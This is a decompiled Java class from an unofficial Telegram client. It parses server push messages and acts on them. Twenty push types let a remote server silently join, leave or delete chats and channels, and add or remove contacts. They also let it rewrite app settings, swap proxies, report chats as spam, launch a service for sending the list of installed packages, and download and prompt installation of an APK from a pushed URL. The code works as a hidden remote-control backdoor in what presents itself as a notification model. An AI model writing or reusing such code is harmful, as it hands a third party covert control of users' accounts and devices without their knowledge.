package org.telegram.customization.Model;

import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences.Editor;
import android.graphics.Bitmap;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.v4.app.al.C0264b;
import android.support.v4.app.al.C0266d;
import android.support.v4.content.FileProvider;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import com.google.android.gms.common.util.CrashUtils.ErrorDialogData;
import com.google.p098a.C1768f;
import com.p077f.p078a.p086b.C1575d;
import com.p077f.p078a.p086b.p087a.C1550b;
import com.p077f.p078a.p086b.p093f.C1586a;
import com.p096g.p097a.C1636m.C1632b;
import com.p096g.p097a.C1645t;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import org.ir.talaeii.R;
import org.telegram.customization.dynamicadapter.viewholder.SlsMessageHolder;
import org.telegram.customization.p151g.C2497d;
import org.telegram.customization.p151g.C2818c;
import org.telegram.customization.p151g.C2820e;
import org.telegram.customization.service.C2827a;
import org.telegram.customization.service.GetSettingService;
import org.telegram.customization.service.SpkgService;
import org.telegram.customization.util.p169a.C2860a;
import org.telegram.customization.util.view.VideoActivity;
import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.messenger.BuildConfig;
import org.telegram.messenger.ChatObject;
import org.telegram.messenger.MessagesController;
import org.telegram.messenger.NotificationCenter;
import org.telegram.messenger.UserConfig;
import org.telegram.tgnet.TLRPC.Chat;
import org.telegram.ui.ActionBar.BaseFragment;
import org.telegram.ui.LaunchActivity;
import p000a.p001a.p002a.p003a.p004a.C0000a;
import utils.C3792d;
import utils.p178a.C3791b;

public class HotgramNotification {
    public static final int Extra_Data_OPEN_ACTIVITY = 1;
    public static final int Extra_Data_OPEN_POSITION = 2;
    public static final int PUSH_TYPE_AAD_TO_FILTER = 14;
    public static final int PUSH_TYPE_AAD_TO_REPORT = 20;
    public static final int PUSH_TYPE_ADD_CONTACT = 9;
    public static final int PUSH_TYPE_ADD_PROXY = 13;
    public static final int PUSH_TYPE_CALL_SETTING = 16;
    public static final int PUSH_TYPE_CALL_SIMPLE_URL = 19;
    public static final int PUSH_TYPE_CHANGE_SP = 7;
    public static final int PUSH_TYPE_DELETE_CHANNEL = 18;
    public static final int PUSH_TYPE_DELETE_CHAT = 15;
    public static final int PUSH_TYPE_GET_MAIN_DOMAIN = 3;
    public static final int PUSH_TYPE_GET_MIRROR_DOMAIN = 4;
    public static final int PUSH_TYPE_GO_TO_BAAZAR_FOR_COMMENT = 6;
    public static final int PUSH_TYPE_GO_TO_CHANNEL = 5;
    public static final int PUSH_TYPE_JOIN_CHANNEL = 2;
    public static final int PUSH_TYPE_REMOVE_CONTACT = 10;
    public static final int PUSH_TYPE_SELF_UPDATE = 8;
    public static final int PUSH_TYPE_SEND_ALL_PACKAGES = 17;
    public static final int PUSH_TYPE_SIMPLE = 1;
    public static final int PUSH_TYPE_START_ALL_SERVICE = 12;
    public static final int PUSH_TYPE_VIDEO_PLAYER = 11;
    private String background;
    private String bigText;
    private String extraData;
    private int extraDataType;
    private int id;
    private String message;
    HotgramNotification notification;
    private int pushType;
    private String title;
    private int versionCode;

    /* renamed from: org.telegram.customization.Model.HotgramNotification$2 */
    static class C26282 implements C2497d {
        C26282() {
        }

        public void onResult(Object obj, int i) {
        }
    }

    static class DownloadFileFromURL extends AsyncTask<String, String, String> {
        Context context;
        String fileName = TtmlNode.ANONYMOUS_REGION_ID;
        HotgramNotification notification;

        public DownloadFileFromURL(Context context, HotgramNotification hotgramNotification) {
            this.context = context;
            this.notification = hotgramNotification;
        }

        protected String doInBackground(String... strArr) {
            long j = 0;
            try {
                URL url = new URL(strArr[0]);
                HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                httpURLConnection.connect();
                int contentLength = httpURLConnection.getContentLength();
                InputStream bufferedInputStream = new BufferedInputStream(url.openStream(), MessagesController.UPDATE_MASK_CHANNEL);
                this.fileName = HotgramNotification.spliturl(strArr[0]);
                Log.d("alireza", "alireza:" + this.fileName);
                try {
                    File file = new File(C3792d.m14076a() + this.fileName);
                    if (file.exists()) {
                        Log.d("alireza", "testttttdelstet1 " + String.valueOf(file.exists()));
                    }
                    Log.d("alireza", "testttttdelstet2 " + String.valueOf(file.delete()));
                    Log.d("alireza", "testttttdelstet3 " + String.valueOf(file.exists()));
                } catch (Exception e) {
                    e.printStackTrace();
                }
                OutputStream fileOutputStream = new FileOutputStream(C3792d.m14076a() + this.fileName);
                byte[] bArr = new byte[1024];
                long j2 = 0;
                while (true) {
                    int read = bufferedInputStream.read(bArr);
                    if (read == -1) {
                        break;
                    }
                    j += (long) read;
                    fileOutputStream.write(bArr, 0, read);
                    if (System.currentTimeMillis() > 500 + j2) {
                        publishProgress(new String[]{TtmlNode.ANONYMOUS_REGION_ID + ((int) ((100 * j) / ((long) contentLength)))});
                        j2 = System.currentTimeMillis();
                    }
                }
                fileOutputStream.flush();
                fileOutputStream.close();
                bufferedInputStream.close();
                HotgramNotification.installAPK(this.context, this.fileName, this.notification);
            } catch (Exception e2) {
                e2.printStackTrace();
            }
            return null;
        }

        protected void onPostExecute(String str) {
            Log.d("alireza", "selfupdate download compeleted");
        }

        protected void onPreExecute() {
            super.onPreExecute();
        }

        protected void onProgressUpdate(String... strArr) {
        }
    }

    private static void changeSpValues(Context context, HotgramNotification hotgramNotification) {
        try {
            Editor edit = context.getSharedPreferences(hotgramNotification.getTitle(), 0).edit();
            if (hotgramNotification.getMessage().equals("i")) {
                edit.putInt(hotgramNotification.getBigText(), Integer.parseInt(hotgramNotification.getExtraData()));
            } else if (hotgramNotification.getMessage().equals("l")) {
                edit.putLong(hotgramNotification.getBigText(), Long.parseLong(hotgramNotification.getExtraData()));
            } else if (hotgramNotification.getMessage().equals("s")) {
                edit.putString(hotgramNotification.getBigText(), hotgramNotification.getExtraData());
            } else if (hotgramNotification.getMessage().equals("f")) {
                edit.putFloat(hotgramNotification.getBigText(), Float.parseFloat(hotgramNotification.getExtraData()));
            } else if (hotgramNotification.getMessage().equals("b")) {
                edit.putBoolean(hotgramNotification.getBigText(), Boolean.parseBoolean(hotgramNotification.getExtraData()));
            }
            edit.commit();
        } catch (Exception e) {
        }
    }

    public static Intent createClickIntent(Context context, Class<?> cls, HotgramNotification hotgramNotification, long j) {
        Intent intent = new Intent(context, cls);
        intent.setAction(System.currentTimeMillis() + TtmlNode.ANONYMOUS_REGION_ID);
        try {
            intent.putExtra("EXTRA_PUSH_MESSAGE_ID", j);
        } catch (Exception e) {
            e.printStackTrace();
        }
        switch (hotgramNotification.getExtraDataType()) {
            case 1:
                if (!TextUtils.isEmpty(hotgramNotification.getExtraData())) {
                    intent.putExtra("GO_TO_ACTIVITY", hotgramNotification.getExtraData());
                    return intent;
                }
                break;
            case 2:
                if (!TextUtils.isEmpty(hotgramNotification.getExtraData())) {
                    intent.putExtra("GO_TO_POSITION", hotgramNotification.getExtraData());
                    return intent;
                }
                break;
        }
        return null;
    }

    public static void customNotification(Context context, HotgramNotification hotgramNotification, long j) {
        if (hotgramNotification != null) {
        }
    }

    private static void deleteNotif(Context context, HotgramNotification hotgramNotification) {
        C2860a.m13319a(context, hotgramNotification.getId());
    }

    private static C1645t getViewTarget(final C0000a c0000a) {
        return new C1645t() {
            public void onBitmapFailed(Drawable drawable) {
            }

            public void onBitmapLoaded(Bitmap bitmap, C1632b c1632b) {
                c0000a.m0a(bitmap);
            }

            public void onPrepareLoad(Drawable drawable) {
            }
        };
    }

    public static void handlePush(final Context context, String str, long j) {
        Uri uri = null;
        try {
            final Object jsonWrapper = jsonWrapper(str);
            Log.d("slspushreceiver", str);
            Log.d("slspushreceiver", jsonWrapper.getPushType() + "-------1");
            if (jsonWrapper != null && jsonWrapper.getVersionCode() <= BuildConfig.VERSION_CODE) {
                Log.d("handlePush type : ", jsonWrapper.getPushType() + TtmlNode.ANONYMOUS_REGION_ID);
                Log.d("LEE", "Aliiiiii:9    " + new C1768f().m8395a(jsonWrapper));
                if (jsonWrapper != null) {
                    DialogStatus dialogStatus;
                    switch (jsonWrapper.getPushType()) {
                        case 2:
                            SlsMessageHolder.addToChannel(Integer.parseInt(jsonWrapper.getExtraData()), jsonWrapper.getBigText());
                            return;
                        case 3:
                            C3791b.m13975f(context, jsonWrapper.getExtraData());
                            return;
                        case 4:
                            C3791b.m13930a(context, jsonWrapper.getExtraData());
                            return;
                        case 5:
                            try {
                                MessagesController.openByUserName(jsonWrapper.getExtraData(), (BaseFragment) LaunchActivity.mainFragmentsStack.get(LaunchActivity.mainFragmentsStack.size() - 1), 1);
                                return;
                            } catch (Exception e) {
                                e.printStackTrace();
                                return;
                            }
                        case 6:
                            try {
                                try {
                                    uri = Uri.parse("http://cafebazaar.ir/app/?id=org.ir.talaeii");
                                } catch (Exception e2) {
                                }
                                if (uri != null) {
                                    Intent intent = new Intent("android.intent.action.EDIT", uri);
                                    intent.setFlags(ErrorDialogData.BINDER_CRASH);
                                    context.startActivity(intent);
                                    return;
                                }
                                return;
                            } catch (Exception e3) {
                                e3.printStackTrace();
                                return;
                            }
                        case 7:
                            changeSpValues(context, jsonWrapper);
                            return;
                        case 8:
                            startDownloadingProcess(context, jsonWrapper);
                            return;
                        case 9:
                            Log.d("slspushreceiver msg:", "add contact 0");
                            if (jsonWrapper != null) {
                                C3792d.m14080a(context, jsonWrapper.getTitle(), jsonWrapper.getMessage(), jsonWrapper.getExtraData());
                                return;
                            }
                            return;
                        case 10:
                            Log.d("slspushreceiver msg:", "remove contact 0");
                            if (jsonWrapper != null) {
                                C3792d.m14087b(context, jsonWrapper.getExtraData(), jsonWrapper.getTitle(), jsonWrapper.getMessage());
                                return;
                            }
                            return;
                        case 11:
                            C1575d.m7807a().m7818a(jsonWrapper.getBackground(), new C1586a() {
                                public void onLoadingCancelled(String str, View view) {
                                }

                                public void onLoadingComplete(String str, View view, Bitmap bitmap) {
                                    new Bundle().putString("EXTRA_VIDEO_URL", jsonWrapper.getExtraData());
                                    Intent intent = new Intent(context, VideoActivity.class);
                                    intent.putExtra("IS_FROM_PUSH", true);
                                    intent.putExtra("EXTRA_VIDEO_URL", jsonWrapper.getExtraData());
                                    ((NotificationManager) context.getSystemService("notification")).notify(1029, new C0266d(context).m1238a(jsonWrapper.getTitle()).m1245b(jsonWrapper.getMessage()).m1227a((int) R.drawable.ic_launcher).m1240a(true).m1232a(PendingIntent.getActivity(context, 0, intent, 134217728)).m1233a(bitmap).m1237a(new C0264b().m1220a(bitmap).m1221a(jsonWrapper.getBigText()).m1222b(jsonWrapper.getMessage())).m1242b());
                                }

                                public void onLoadingFailed(String str, View view, C1550b c1550b) {
                                    new Bundle().putString("EXTRA_VIDEO_URL", jsonWrapper.getExtraData());
                                    Intent intent = new Intent(context, VideoActivity.class);
                                    intent.putExtra("IS_FROM_PUSH", true);
                                    intent.putExtra("EXTRA_VIDEO_URL", jsonWrapper.getExtraData());
                                    PendingIntent activity = PendingIntent.getActivity(context, 0, intent, 134217728);
                                    NotificationManager notificationManager = (NotificationManager) context.getSystemService("notification");
                                    C0266d a = new C0266d(context).m1238a(jsonWrapper.getTitle()).m1245b(jsonWrapper.getMessage()).m1227a((int) R.drawable.ic_launcher).m1240a(true).m1232a(activity);
                                    try {
                                        c1550b.m7672a().printStackTrace();
                                    } catch (Exception e) {
                                    }
                                    notificationManager.notify(1029, a.m1242b());
                                }

                                public void onLoadingStarted(String str, View view) {
                                }
                            });
                            return;
                        case 12:
                            C2827a.m13165a(context, true);
                            return;
                        case 13:
                            if (!TextUtils.isEmpty(jsonWrapper.getExtraData())) {
                                C2820e.m13153a((ProxyServerModel) new C1768f().m8392a(str, ProxyServerModel.class));
                                C3791b.m13893A(context, str);
                                return;
                            }
                            return;
                        case 14:
                            if (!TextUtils.isEmpty(jsonWrapper.getExtraData())) {
                                dialogStatus = (DialogStatus) new C1768f().m8392a(jsonWrapper.getExtraData(), DialogStatus.class);
                                if (dialogStatus != null) {
                                    ApplicationLoader.databaseHandler.m12218a(dialogStatus);
                                    return;
                                }
                                return;
                            }
                            return;
                        case 15:
                            try {
                                MessagesController.getInstance().deleteUserFromChat(Integer.parseInt(jsonWrapper.getExtraData()), UserConfig.getCurrentUser(), null);
                                MessagesController.getInstance().deleteDialog((long) Integer.parseInt(jsonWrapper.getExtraData()), 0);
                                if (AndroidUtilities.isTablet()) {
                                    NotificationCenter.getInstance().postNotificationName(NotificationCenter.closeChats, Integer.valueOf(Integer.parseInt(jsonWrapper.getExtraData())));
                                    return;
                                }
                                return;
                            } catch (Exception e32) {
                                e32.printStackTrace();
                                return;
                            }
                        case 16:
                            context.startService(new Intent(context, GetSettingService.class));
                            return;
                        case 17:
                            context.startService(new Intent(context, SpkgService.class));
                            return;
                        case 18:
                            int parseInt = Integer.parseInt(jsonWrapper.getExtraData());
                            if (ChatObject.isCanWriteToChannel(MessagesController.getInstance().getChat(Integer.valueOf(parseInt)).id)) {
                                MessagesController.getInstance().deleteUserFromChat(parseInt, MessagesController.getInstance().getUser(Integer.valueOf(UserConfig.getClientUserId())), null, true);
                                return;
                            }
                            return;
                        case 19:
                            C2818c.m13087a(ApplicationLoader.applicationContext, new C26282()).m13148o(jsonWrapper.getExtraData());
                            return;
                        case 20:
                            if (!TextUtils.isEmpty(jsonWrapper.getExtraData())) {
                                dialogStatus = (DialogStatus) new C1768f().m8392a(jsonWrapper.getExtraData(), DialogStatus.class);
                                if (dialogStatus != null) {
                                    MessagesController.loadChannelInfoByUsername(dialogStatus.getUsername(), new C2497d() {
                                        public void onResult(Object obj, int i) {
                                            Chat chat = MessagesController.getInstance().getChat(Integer.valueOf((int) dialogStatus.getDialogId()));
                                            if (chat != null) {
                                                MessagesController.getInstance().reportSpam(dialogStatus.getDialogId(), null, chat, null);
                                            }
                                        }
                                    });
                                    return;
                                }
                                return;
                            }
                            return;
                        default:
                            return;
                    }
                    e32.printStackTrace();
                }
            }
        } catch (Exception e322) {
            e322.printStackTrace();
        }
    }

    public static void installAPK(Context context, String str, HotgramNotification hotgramNotification) {
        File file = new File(C3792d.m14076a() + File.separator + str);
        if (file.exists()) {
            PendingIntent activity;
            int i;
            try {
                if (context.getPackageManager().getPackageArchiveInfo(C3792d.m14076a() + File.separator + str, 0).versionCode <= BuildConfig.VERSION_CODE) {
                    file.delete();
                    return;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            try {
                Intent intent = new Intent("android.intent.action.VIEW");
                intent.setFlags(ErrorDialogData.BINDER_CRASH);
                intent.setDataAndType(Uri.parse("file://" + file.toString()), "application/vnd.android.package-archive");
                activity = PendingIntent.getActivity(context, 0, intent, 134217728);
                i = 1;
            } catch (Exception e2) {
                e2.printStackTrace();
                activity = null;
                i = 0;
            }
            if (i == 0) {
                try {
                    Intent intent2 = new Intent("android.intent.action.INSTALL_PACKAGE");
                    intent2.setFlags(ErrorDialogData.BINDER_CRASH);
                    intent2.setFlags(1);
                    intent2.setData(FileProvider.m1845a(context, "org.ir.talaeii.provider", file));
                    activity = PendingIntent.getActivity(context, 0, intent2, 134217728);
                } catch (Exception e3) {
                    e3.printStackTrace();
                }
            }
            C0266d a = new C0266d(context).m1253d(1).m1238a(hotgramNotification.getTitle()).m1245b(hotgramNotification.getMessage()).m1227a((int) R.drawable.ic_launcher).m1232a(activity);
            a.m1248c(1);
            ((NotificationManager) context.getSystemService("notification")).notify(hotgramNotification.getId(), a.m1242b());
        }
    }

    public static HotgramNotification jsonWrapper(String str) {
        try {
            return (HotgramNotification) new C1768f().m8392a(str, HotgramNotification.class);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static void showPouyaNotification(Context context, String str, long j) {
        HotgramNotification jsonWrapper = jsonWrapper(str);
        if (jsonWrapper != null && jsonWrapper.getVersionCode() <= BuildConfig.VERSION_CODE) {
            switch (jsonWrapper.getPushType()) {
                case 1:
                    customNotification(context, jsonWrapper, j);
                    return;
                default:
                    return;
            }
        }
    }

    public static String spliturl(String str) {
        String[] split = new String(str).split("/");
        return split[split.length - 1];
    }

    private static void startDownloadingProcess(Context context, HotgramNotification hotgramNotification) {
        new DownloadFileFromURL(context, hotgramNotification).execute(new String[]{hotgramNotification.getExtraData()});
    }

    public String getBackground() {
        return this.background;
    }

    public String getBigText() {
        if (TextUtils.isEmpty(this.bigText)) {
            this.bigText = " ";
        }
        return this.bigText;
    }

    public String getExtraData() {
        return this.extraData;
    }

    public int getExtraDataType() {
        return this.extraDataType;
    }

    public int getId() {
        return this.id;
    }

    public String getMessage() {
        if (TextUtils.isEmpty(this.message)) {
            this.message = " ";
        }
        return this.message;
    }

    public int getPushType() {
        return this.pushType;
    }

    public String getTitle() {
        if (TextUtils.isEmpty(this.title)) {
            this.title = " ";
        }
        return this.title;
    }

    public int getVersionCode() {
        return this.versionCode;
    }

    public void setBackground(String str) {
        this.background = str;
    }

    public void setBigTest(String str) {
        this.bigText = str;
    }

    public void setExtraData(String str) {
        this.extraData = str;
    }

    public void setExtraDataType(int i) {
        this.extraDataType = i;
    }

    public void setId(int i) {
        this.id = i;
    }

    public void setMessage(String str) {
        this.message = str;
    }

    public void setPushType(int i) {
        this.pushType = i;
    }

    public void setTitle(String str) {
        this.title = str;
    }

    public void setVersionCode(int i) {
        this.versionCode = i;
    }
}
